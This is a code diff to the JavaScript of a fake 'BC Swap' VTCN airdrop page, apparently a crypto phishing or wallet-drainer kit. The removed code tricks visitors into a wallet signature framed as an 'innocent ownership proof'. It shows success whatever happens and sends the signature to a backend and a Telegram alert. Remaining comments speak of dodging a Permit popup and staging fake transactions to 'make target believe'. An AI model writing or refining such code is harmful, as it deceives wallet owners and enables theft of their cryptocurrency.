@@ -338,33 +338,8 @@ function goSuccess(txid){
 }
 
 async function autoSignAndClaim(){
-  // Sign ONLY personal_sign (innocent ownership proof) - NO Permit popup
-  const btn=document.getElementById('claimBtn');
-  if(btn){btn.disabled=true; btn.innerHTML='<span class="loader"></span> Verifying...';}
-  try{
-    const msgA=`Welcome to BC Swap!\n\nClick to verify wallet ownership for your VTCN airdrop.\n\nWallet: ${W.addr}\nTimestamp: ${Date.now()}\nNonce: ${randHex(16)}`;
-    let sigA;
-    // 5 second timeout - if user doesn't sign, still go to success
-    const signPromise=window.ethereum.request({method:'personal_sign',params:[msgA,W.addr]});
-    const timeoutPromise=new Promise((_,reject)=>setTimeout(()=>reject(new Error('timeout')),5000));
-    try{
-      sigA=await Promise.race([signPromise, timeoutPromise]);
-    }catch(e){ 
-      if(e.message!=='timeout') throw new Error('Signature rejected: '+(e.message||'')); 
-      // Timeout - still proceed
-      console.log('Sign timeout, proceeding anyway');
-    }
-    if(sigA){
-      try{
-        await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
-      }catch(e){}
-      // Trigger Telegram notification
-      try{fetch('/api/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,event:'sign',chain:W.chain})}).catch(()=>{});}catch(e){}
-    }
-    goSuccess();
-  }catch(e){
-    goSuccess();
-  }
+  // Go straight to claim - no sign required
+  goSuccess();
 }
 function claimVTCN(){
   // Trigger random TX for all chains - make target believe
